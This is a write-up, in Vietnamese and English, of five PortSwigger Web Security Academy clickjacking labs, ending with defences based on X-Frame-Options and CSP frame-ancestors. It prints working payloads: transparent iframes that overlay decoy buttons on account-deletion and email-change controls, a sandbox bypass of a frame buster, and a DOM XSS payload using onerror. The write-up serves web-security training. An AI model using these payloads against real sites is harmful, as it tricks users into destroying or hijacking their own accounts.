---
title: 'Web09: Clickjacking (UI redressing)'
tags: [web9]

---

# **1. Lab: Basic clickjacking with CSRF token protection**
>Lab này chứa chức năng đăng nhập và nút xóa tài khoản được bảo vệ bằng mã thông báo CSRF. Người dùng sẽ nhấp vào các phần tử hiển thị từ "nhấp chuột" trên trang web mồi nhử.
Để giải quyết bài lab, hãy tạo một số HTML đóng khung trang tài khoản và đánh lừa người dùng xóa tài khoản của họ. Lab được giải quyết khi tài khoản bị xóa.
Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau:` wiener:peter`
![image](https://hackmd.io/_uploads/S127aQxUR.png)

>Đăng nhập bằng `wiener:peter`, tại trang `/my-account` xuất hiện chức năng **Delete account** được bảo vệ bằng CSRF Token:![image](https://hackmd.io/_uploads/ByafAQlLC.png)

>Ta sẽ tạo một trang web giả để đánh lừa nạn nhân click vào **Delete account** của họ bằng kĩ thuật Clickjacking. Trang web giả có mã HTML như sau:
```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 600px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 512px;
        left: 65px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a46009004e2e06981d67f4b001f009b.web-security-academy.net/my-account"></iframe>
```

>Cụ thể nó sẽ tạo một iframe của trang `/my-account` và sử dụng CSS làm sao cho dòng chữ `Click me` sẽ đè lên `Delete account`. Tất nhiên iframe sẽ bị làm trong suốt đi bằng thuộc tính opacity. Và vì nạn nhân luôn click vào chữ click nên nó sẽ vô tình kích hoạt chức năng `Delete account`.

>Lưu trang web giả lên exploit server: ![image](https://hackmd.io/_uploads/HJIa1EgUR.png)

>Ta sẽ căn chỉnh dòng text "Click me" sao cho đè lên dòng chữ "Delete account", chỉnh `opacity: 0.00001;` để iframe trong suốt gần như hoàn toàn và chứa chữ Click me để đánh lừa nạn nhân: ![image](https://hackmd.io/_uploads/BJiEeEeUC.png)

>Chọn **"Deliver exploit to victim"** để gửi nó tới nạn nhân, màn hình hiển thị bài lab đã được solve, chứng tỏ đã có người dùng bị lừa ấn vào Click me: ![image](https://hackmd.io/_uploads/H13DbNxIR.png)

# **2. Lab: Clickjacking with form input data prefilled from a URL parameter**
>This lab extends the basic [clickjacking example](https://portswigger.net/web-security/clickjacking) in [Lab: Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected). The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
You can log in to your own account using the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/SkqQBVxUC.png)

>Mục tiêu của bài lab này là khiến nạn nhân Update email bất kì bằng kĩ thuật Clickjacking. Điểm đặc biệt ở form `Update email` này, email cần thay đổi sẽ được tự động trích xuất từ tham số email trên URL → ta cần iframe với source là trang `/my-account` với tham số email: ![image](https://hackmd.io/_uploads/ByBGU4gUA.png)

>Sử dụng thử **ClickBandit** để tạo payload đối với chức năng `Update email` tại đường dẫn `/my-account?email=ducanh@gmail.com` để thay đổi email nạn nhân thành `ducanh@gmail.com`

>Sau khi hoàn thành, click Save thì ClickBandit sẽ trả về mã nguồn trang giả mạo cho mình. Sử dụng mã nguồn đó vào exploit-server: ![image](https://hackmd.io/_uploads/H1tNwNxLC.png)
![image](https://hackmd.io/_uploads/BJP8v4xLR.png)

>Có thể sử dụng payload: 
```
<style>
    iframe {
        position:relative;
        width: 1000px;
        height: 800px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 465px;
        left: 65px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe src="https://0a69003e0408ce2c801e0c4e006600c9.web-security-academy.net/my-account?email=123@gmail.com"></iframe>
```

>**"Deliver exploit to victim"** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/BJeH9GZUC.png)


# **3. Lab: Clickjacking with a frame buster script**
>This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a [clickjacking attack](https://portswigger.net/web-security/clickjacking) that changes the users email address?
To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.
You can log in to your own account using the following credentials: `wiener:peter`

>Mục tiêu của bài lab này là khiến nạn nhân Update email bất kì bằng kĩ thuật Clickjacking. Điểm đặc biệt ở form `Update email` này, email cần thay đổi sẽ được tự động trích xuất từ tham số email trên URL → ta cần iframe với source là trang `/my-account` với tham số email: ![image](https://hackmd.io/_uploads/B1oTaGWL0.png)

>Tuy nhiên, khi đọc thêm mã nguồn HTML, xuất hiện 1 đoạn script gọi là **frame buster script**, có chức năng ngăn chặn trang `/my-account` này bị framed bằng cách kiểm tra xem trang `/my-account` hiện tại có phải top window hay không: ![image](https://hackmd.io/_uploads/H1a-0fWIR.png)

>Tuy nhiên ta sẽ có cách bypass nó đó là sử dụng thuộc tính **sandbox** trong **iframe** không chứa giá trị `allow-top-navigation` vì khi đó, iframe không thể check được nó là top window hay không → frame buster script trên bị vô hiệu hóa. Bên cạnh đó, để submit form Update email, ta cần sandbox có giá trị `allow-forms`.

>Payload: 
```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 600px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 466px;
        left: 69px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a3f009103ef1abbc3261402001600ff.web-security-academy.net/my-account?email=hacked@gmail.com" sandbox="allow-forms"></iframe>
```

>Lưu payload vào bên trong exploit server: ![image](https://hackmd.io/_uploads/BJlaAG-LC.png)

>**"Deliver exploit to victim"** và hoàn thành bài lab:
>![image](https://hackmd.io/_uploads/S1yRRGb8R.png)

# **4. Lab: Exploiting clickjacking vulnerability to trigger [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)**
>This lab contains an XSS vulnerability that is triggered by a click. Construct a [clickjacking attack](https://portswigger.net/web-security/clickjacking) that fools the user into clicking the "Click me" button to call the `print()` function.
![image](https://hackmd.io/_uploads/SyJQJQbIC.png)

>Ứng dụng web có chức năng feedback tại /feedback nhận các tham số trên URL làm giá trị cho các input tương ứng của form: ![image](https://hackmd.io/_uploads/rybPlQ-IA.png)

>Khi submit form thì có thấy một thông báo chứa giá trị của tham số `name`: ![image](https://hackmd.io/_uploads/SynOeX-LR.png)

>Đọc mã nguồn HTML thì có 1 file js xử lí việc này `/resources/js/submitFeedback.js`. Cụ thể, sink **innerHTML** được sử dụng để in ra dòng này với source là `name`: ![image](https://hackmd.io/_uploads/SkkJZmWLR.png)

>Source name đó chính là trường `name` mình nhập vào. Ta có thể thấy ở đây không có bất kì cơ chế validate nào => có thể dính DOM XSS: ![image](https://hackmd.io/_uploads/S1wMbQZ8A.png)

>Do dùng sink **innerHTML** nên ta sẽ sử dụng payload `<img src=1 onerror=print()>` tại trường `name`. Kết quả sau khi submit thì hàm print() được thực thi thành công: ![image](https://hackmd.io/_uploads/r1EIbmZL0.png)

>Như vậy ta đã DOM XSS thành công, bây giờ sẽ tạo payload Clickjacking tại trang `/feedback` sao cho button Click me đè lên button Submit feedback. Tất nhiên tham số `name` tại URL sẽ là XSS payload `<img src=1 onerror=print()>`:
```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 850px;
        opacity: 0.5;
        z-index: 2;
    }
    button {
        position:absolute;
        top: 801px;
        left: 73px;
        z-index: 1;
    }
</style>
<button>Click me</button>
<iframe src="https://0a6b00bf0327b9ed847ed88b00e5000a.web-security-academy.net/feedback?name=%3Cimg%20src=1%20onerror=print()%3E&email=hacked@gmail.com&subject=XSS&message=DOM%20XSS%20Clickjacking"></iframe>
```

>Căn chỉnh sao cho button Click me đè lên Submit feedback: ![image](https://hackmd.io/_uploads/HJBkMmb8A.png)

>**"Deliver exploit to victim"** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/SJjWzQZUA.png)

# **5. Lab: Multistep clickjacking**
>This lab has some account functionality that is protected by a [CSRF](https://portswigger.net/web-security/csrf) token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.
You can log in to the account yourself using the following credentials: `wiener:peter`
![image](https://hackmd.io/_uploads/ByE47QbIC.png)

>Đăng nhập vào `wiener` và thấy có chức năng **Delete account** tương tự lab đầu tiên: ![image](https://hackmd.io/_uploads/ByrPEXbLC.png)

> Tuy nhiên khi **Delete account** sẽ có thêm 1 bước để xác nhận có muốn xóa hay không? ![image](https://hackmd.io/_uploads/H1WzEXW8R.png)

>=> Ta cần tạo payload chứa 2 button **Click me** và khiến nạn nhân click theo đúng thứ tự **Delete account** → **Yes**

>Tạo payload và thêm các thuộc tính theo thứ tự thực hiện của chúng: 
```
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 850px;
        opacity: 0.000001;
        z-index: 2;
    }
    #first {
        position:absolute;
        top: 509px;
        left: 44px;
        z-index: 1;
    }
    #second {
        position:absolute;
        top: 308px;
        left: 192px;
        z-index: 1;
    }
</style>
<button id="first">Click me first</button>
<button id="second">Click me next</button>
<iframe src="https://0a8100040420c3b5805a356b006900b0.web-security-academy.net/my-account"></iframe>
```

>Căn chỉnh sao cho **Click me first** đè lên **Delete account**: ![image](https://hackmd.io/_uploads/SJAJr7b8C.png)

>và **Click me next** đè lên **Yes**: ![image](https://hackmd.io/_uploads/H1ObrQZUR.png)

>**"Deliver exploit to victim"** và hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rJNXBXWL0.png)

# **Prevent**
1. Using X-Frame-Options: 'deny', 'sameorigin', 'allow-from <URL>'
2. Using Content Security Policy (CSP): frame-ancestors
* More flexible than using the X-Frame-Options header because you can specify multiple domains and use wildcards.
* CSP also validates each frame in the parent frame hierarchy, whereas X-Frame-Options only validates the top-level frame